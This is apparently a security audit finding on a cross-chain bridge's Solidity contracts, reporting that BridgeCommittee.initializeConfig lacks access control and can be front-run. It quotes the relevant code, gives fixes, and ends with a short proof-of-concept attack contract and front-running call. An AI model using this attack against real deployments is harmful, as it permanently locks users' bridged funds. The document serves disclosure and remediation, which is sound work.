### Title
Unprotected `initializeConfig` in `BridgeCommittee` Allows Any Caller to Permanently Inject a Malicious Config — (`File: bridge/evm/contracts/BridgeCommittee.sol`)

---

### Summary

`BridgeCommittee.initializeConfig` is a public, access-control-free function that sets the `IBridgeConfig` contract address used by every bridge operation. Because it is called in a separate transaction from the proxy deployment, any Ethereum user can front-run the deployer's call and permanently bind the committee to an attacker-controlled config, making all subsequent bridge operations fail or behave incorrectly. The config slot can never be overwritten once set.

---

### Finding Description

`BridgeCommittee` is deployed as a UUPS proxy. Its `initialize` function (which sets committee members and stakes) is called atomically with proxy deployment via `Upgrades.deployUUPSProxy`. However, the config address is set in a **separate, subsequent call** to `initializeConfig`:

```solidity
// bridge/evm/contracts/BridgeCommittee.sol  lines 63-66
function initializeConfig(address _config) external {
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}
``` [1](#0-0) 

There is no `onlyOwner`, no `initializer`, and no committee-signature guard. The sole protection is the one-time check `address(config) == address(0)`. The deployment script confirms the two-step pattern:

```solidity
// bridge/evm/script/deploy_bridge.s.sol  lines 124-175
address bridgeCommittee = Upgrades.deployUUPSProxy("BridgeCommittee.sol", ...);
// ... deploy BridgeConfig in a separate tx ...
BridgeCommittee(bridgeCommittee).initializeConfig(address(bridgeConfig));
``` [2](#0-1) 

An attacker watching the mempool can submit `initializeConfig(maliciousConfig)` with higher gas between the proxy deployment and the deployer's `initializeConfig` call. Because the check only passes when `config == address(0)`, the deployer's subsequent call reverts with `"BridgeCommittee: Config already initialized"`, and the malicious config is permanently locked in.

The `config` object is consumed throughout the entire bridge:

- `SuiBridge.transferBridgedTokensWithSignatures` calls `committee.config().chainID()` and `committee.config().tokenAddressOf()` to validate chain IDs and resolve token addresses for vault transfers. [3](#0-2) 
- `_transferTokensFromVault` calls `committee.config().tokenAddressOf(tokenID)` to determine which ERC-20 to move out of the vault. [4](#0-3) 
- The `onlySupportedChain` modifier calls `committee.config().isChainSupported(targetChainID)` on every inbound and outbound operation. [5](#0-4) 

A malicious `IBridgeConfig` can make `isChainSupported` always return `false`, `chainID()` return a wrong value, or `tokenAddressOf` return `address(0)`, causing every bridge call to revert.

The deploy script also calls `initializeConfig` on the bare implementation contract, which is equally unprotected:

```solidity
// bridge/evm/script/deploy_bridge.s.sol  lines 176-178
BridgeCommittee committeeImplementation =
    BridgeCommittee(Upgrades.getImplementationAddress(bridgeCommittee));
committeeImplementation.initializeConfig(address(bridgeConfig));
``` [6](#0-5) 

---

### Impact Explanation

All tokens held in `BridgeVault` become permanently inaccessible. `transferBridgedTokensWithSignatures` and `bridgeERC20` both gate on `onlySupportedChain` and on `config.chainID()` / `config.tokenAddressOf()`. With a malicious config returning wrong values, every withdrawal reverts. Because `initializeConfig` enforces a one-time write (`config == address(0)`), there is no on-chain recovery path short of redeploying the entire bridge system. This satisfies the **permanent fund lock** impact class.

---

### Likelihood Explanation

The attack requires only:
1. Monitoring the Ethereum mempool for the `BridgeCommittee` proxy deployment transaction.
2. Submitting `initializeConfig(maliciousConfig)` with a higher gas price before the deployer's follow-up call.

No special privilege, stake, or committee membership is needed. The attacker is an ordinary Ethereum user. The vulnerability is present on every fresh deployment of the bridge.

---

### Recommendation

Add an access-control guard to `initializeConfig`. The simplest fix is to restrict it to the deployer address captured during `initialize`, or to use the OpenZeppelin `Ownable` pattern:

```solidity
function initializeConfig(address _config) external onlyOwner {
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}
```

Alternatively, pass `_config` directly into `initialize` and set it atomically, eliminating the two-step window entirely:

```solidity
function initialize(
    address[] memory committee,
    uint16[] memory stake,
    uint16 minStakeRequired,
    address _config          // ← added
) external initializer {
    // ... existing committee setup ...
    config = IBridgeConfig(_config);
}
```

---

### Proof of Concept

```
// Attacker script (Foundry)
// 1. Deployer broadcasts BridgeCommittee proxy deployment tx (pending in mempool).
// 2. Attacker sees it, deploys MaliciousConfig:
contract MaliciousConfig is IBridgeConfig {
    function isChainSupported(uint8) external pure returns (bool) { return false; }
    function chainID() external pure returns (uint8) { return 255; }
    function tokenAddressOf(uint8) external pure returns (address) { return address(0); }
    function tokenSuiDecimalOf(uint8) external pure returns (uint8) { return 0; }
    function tokenPriceOf(uint8) external pure returns (uint64) { return 0; }
    function isTokenSupported(uint8) external pure returns (bool) { return false; }
}
// 3. Attacker calls, with higher gas, before deployer's initializeConfig tx:
BridgeCommittee(committeeProxy).initializeConfig(address(maliciousConfig));
// 4. Deployer's initializeConfig reverts: "BridgeCommittee: Config already initialized"
// 5. All bridge operations now revert on onlySupportedChain / chainID checks.
// 6. Vault funds are permanently locked.
```

### Citations

**File:** bridge/evm/contracts/BridgeCommittee.sol (L63-66)
```text
    function initializeConfig(address _config) external {
        require(address(config) == address(0), "BridgeCommittee: Config already initialized");
        config = IBridgeConfig(_config);
    }
```

**File:** bridge/evm/script/deploy_bridge.s.sol (L124-175)
```text
        address bridgeCommittee = Upgrades.deployUUPSProxy(
            "BridgeCommittee.sol",
            abi.encodeCall(
                BridgeCommittee.initialize,
                (
                    deployConfig.committeeMembers,
                    committeeMemberStake,
                    uint16(deployConfig.minCommitteeStakeRequired)
                )
            ),
            opts
        );

        // deploy bridge config =====================================================================

        // convert token prices from uint256 to uint64
        uint64[] memory tokenPrices = new uint64[](deployConfig.tokenPrices.length);
        for (uint256 i; i < deployConfig.tokenPrices.length; i++) {
            tokenPrices[i] = uint64(deployConfig.tokenPrices[i]);
        }

        // convert Sui Decimals from uint256 to uint8
        uint8[] memory suiDecimals = new uint8[](deployConfig.suiDecimals.length);
        for (uint256 i; i < deployConfig.suiDecimals.length; i++) {
            suiDecimals[i] = uint8(deployConfig.suiDecimals[i]);
        }

        // convert Token Id from uint256 to uint8
        uint8[] memory tokenIds = new uint8[](deployConfig.tokenIds.length);
        for (uint256 i; i < deployConfig.tokenIds.length; i++) {
            tokenIds[i] = uint8(deployConfig.tokenIds[i]);
        }

        address bridgeConfig = Upgrades.deployUUPSProxy(
            "BridgeConfig.sol",
            abi.encodeCall(
                BridgeConfig.initialize,
                (
                    address(bridgeCommittee),
                    uint8(deployConfig.sourceChainId),
                    deployConfig.supportedTokens,
                    tokenPrices,
                    tokenIds,
                    suiDecimals,
                    supportedChainIds
                )
            ),
            opts
        );

        // initialize config in the bridge committee
        BridgeCommittee(bridgeCommittee).initializeConfig(address(bridgeConfig));
```

**File:** bridge/evm/script/deploy_bridge.s.sol (L176-178)
```text
        BridgeCommittee committeeImplementation =
            BridgeCommittee(Upgrades.getImplementationAddress(bridgeCommittee));
        committeeImplementation.initializeConfig(address(bridgeConfig));
```

**File:** bridge/evm/contracts/SuiBridge.sol (L67-89)
```text
        IBridgeConfig config = committee.config();

        BridgeUtils.TokenTransferPayload memory tokenTransferPayload =
            BridgeUtils.decodeTokenTransferPayload(message.payload);

        // verify target chain ID is this chain ID
        require(
            tokenTransferPayload.targetChain == config.chainID(), "SuiBridge: Invalid target chain"
        );

        // convert amount to ERC20 token decimals
        uint256 erc20AdjustedAmount = BridgeUtils.convertSuiToERC20Decimal(
            IERC20Metadata(config.tokenAddressOf(tokenTransferPayload.tokenID)).decimals(),
            config.tokenSuiDecimalOf(tokenTransferPayload.tokenID),
            tokenTransferPayload.amount
        );

        _transferTokensFromVault(
            message.chainID,
            tokenTransferPayload.tokenID,
            tokenTransferPayload.recipientAddress,
            erc20AdjustedAmount
        );
```

**File:** bridge/evm/contracts/SuiBridge.sol (L250-264)
```text
        address tokenAddress = committee.config().tokenAddressOf(tokenID);

        // Check that the token address is supported
        require(tokenAddress != address(0), "SuiBridge: Unsupported token");

        // transfer eth if token type is eth
        if (tokenID == BridgeUtils.ETH) {
            vault.transferETH(payable(recipientAddress), amount);
        } else {
            // transfer tokens from vault to target address
            vault.transferERC20(tokenAddress, recipientAddress, amount);
        }

        // update amount bridged
        limiter.recordBridgeTransfers(sendingChainID, tokenID, amount);
```

**File:** bridge/evm/contracts/SuiBridge.sol (L283-289)
```text
    modifier onlySupportedChain(uint8 targetChainID) {
        require(
            committee.config().isChainSupported(targetChainID),
            "SuiBridge: Target chain not supported"
        );
        _;
    }
```
